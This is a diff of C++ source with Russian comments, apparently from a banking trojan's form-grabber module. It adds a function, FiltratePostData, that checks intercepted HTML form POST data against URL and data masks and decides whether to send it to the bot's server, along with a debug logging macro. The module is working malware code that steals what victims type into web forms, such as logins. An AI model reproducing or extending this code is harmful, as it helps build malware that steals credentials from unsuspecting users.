@@ -14,6 +14,19 @@
 
 //---------------------------------------------------------------------------
 
+
+
+#include "BotDebug.h"
+
+namespace FGRFLTDEBUGSTRINGS
+{
+	#include "DbgTemplates.h"
+}
+
+// Объявляем шаблон вывода отладочных строк
+#define FGRFLTDBG FGRFLTDEBUGSTRINGS::DBGOutMessage<>
+
+
 //****************************************************
 //  Массив URL адресов с которых бот будет отправлять
 //  данные HTML форм.
@@ -32,7 +45,7 @@
 #ifndef DEBUGCONFIG
 	char FGR_PARAMS_FILTERS[FGRFILTER_PARAM_SIZE_DATAMASK] = FGRFILTER_PARAM_NAME_DATAMASK;
 #else
-	char FGR_PARAMS_FILTERS[FGRFILTER_PARAM_SIZE_DATAMASK] = "admin\0\0";
+	char FGR_PARAMS_FILTERS[FGRFILTER_PARAM_SIZE_DATAMASK] = "admin\0";
 #endif
 
 #define FGR_PARAMS_FILTERS_HASH 0xBE738607 /* FGR_PARAMS_FILTERS */
@@ -46,7 +59,7 @@
 //  	истину если ссылка поддерживается
 //		формграбером
 //-------------------------------------------------
-bool FiltrateFormGrabberURL(PCHAR URL)
+bool FiltrateFormGrabberURL(const char* URL)
 {
 	//  Ыункция возвращает истину если ссылка
 	//	поддерживается	формграбером
@@ -62,7 +75,7 @@ bool FiltrateFormGrabberURL(PCHAR URL)
 	while (E.Next())
 	{
 		if (WildCmp((char*)URL, E.Line().t_str()))
-            return true;
+			return true;
 	}
 
     return false;
@@ -87,12 +100,29 @@ bool FiltrateFormGrabberData(const char* Data)
 	while (E.Next())
 	{
 		if (WildCmp((char*)Data, E.Line().t_str()))
-            return true;
+			return true;
 	}
 		
     return false;
 }
 
+
+
+//-------------------------------------------------
+//  Функция фильтрует пост данные и в случае
+//  необходимости отправки их на сервер возвращает
+//  истину
+//-------------------------------------------------
+bool FiltratePostData(const char* URL, const char* Data)
+{
+	bool Result = FiltrateFormGrabberURL(URL) ||
+				  FiltrateFormGrabberData(Data);
+	if (Result)
+	{
+		FGRFLTDBG("FormGrabber_Filters", "Отреагировали на пост данные. URL %s", URL);
+	}
+	return Result;
+}
 
 
 
